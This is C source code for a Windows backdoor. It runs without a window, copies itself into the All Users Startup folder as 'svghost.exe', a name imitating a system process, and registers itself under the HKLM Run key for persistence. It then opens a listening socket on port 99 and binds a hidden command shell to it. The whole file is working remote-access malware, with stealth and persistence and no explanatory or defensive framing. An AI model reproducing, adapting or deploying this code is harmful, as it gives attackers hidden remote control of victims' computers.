#pragma comment(lib, "ws2_32.lib")
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#define MASTER_PORT 99 // Listening port

void start_telnet_session() {
    WSADATA wsadata;
    SOCKET listen_socket, client_socket;
    sockaddr_in server_addr;
    PROCESS_INFORMATION process_info;
    STARTUPINFO startup_info;
    char cmd_path[255];

    ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
    ZeroMemory(&startup_info, sizeof(STARTUPINFO));
    ZeroMemory(&wsadata, sizeof(WSADATA));

    GetEnvironmentVariable("COMSPEC", cmd_path, sizeof(cmd_path));
    WSAStartup(0x202, &wsadata);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(MASTER_PORT);
    listen_socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    bind(listen_socket, (sockaddr*)&server_addr, sizeof(server_addr));
    listen(listen_socket, 1);

    int addr_size = sizeof(server_addr);
    client_socket = accept(listen_socket, (sockaddr*)&server_addr, &addr_size);

    startup_info.cb = sizeof(STARTUPINFO);
    startup_info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    startup_info.wShowWindow = SW_HIDE;
    startup_info.hStdInput = (HANDLE)client_socket;
    startup_info.hStdOutput = (HANDLE)client_socket;
    startup_info.hStdError = (HANDLE)client_socket;

    CreateProcess(NULL, cmd_path, NULL, NULL, TRUE, 0, NULL, NULL, &startup_info, &process_info);
    WaitForSingleObject(process_info.hProcess, INFINITE);
    CloseHandle(process_info.hProcess);
    CloseHandle(process_info.hThread);

    closesocket(listen_socket);
    closesocket(client_socket);
    WSACleanup();
}

int modify_registry(HKEY root_key, const char* reg_path, const char* key_name, const char* key_value) {
    HKEY hkey;
    int status = RegOpenKeyEx(root_key, reg_path, 0, KEY_ALL_ACCESS, &hkey);

    if (status != 0) {
        return status;
    }

    status = RegSetValueEx(hkey, key_name, 0, REG_EXPAND_SZ, (CONST BYTE*)key_value, strlen(key_value) + 1);
    RegCloseKey(hkey);

    return status;
}

int set_autostart(const char* key_name, const char* process_path) {
    const char* reg_path = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    return modify_registry(HKEY_LOCAL_MACHINE, reg_path, key_name, process_path);
}

int main(void) {
    char key_name[100];
    char process_path[1024];
    char file_path[MAX_PATH];
    char system_path[MAX_PATH];
    char dest_path[MAX_PATH];

    GetModuleFileName(NULL, file_path, sizeof(file_path));
    GetSystemDirectory(system_path, sizeof(system_path));
    snprintf(dest_path, sizeof(dest_path), "%c%c\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\svghost.exe", system_path[0], system_path[1]);
    CopyFile(file_path, dest_path, TRUE);

    GetPrivateProfileStringA("Main", "KeyName", "keyyy", key_name, sizeof(key_name), ".\\config.ini");
    GetPrivateProfileStringA("Main", "ProcessPath", dest_path, process_path, sizeof(process_path), ".\\config.ini");

    set_autostart(key_name, process_path);
    start_telnet_session();

    return 0;
}
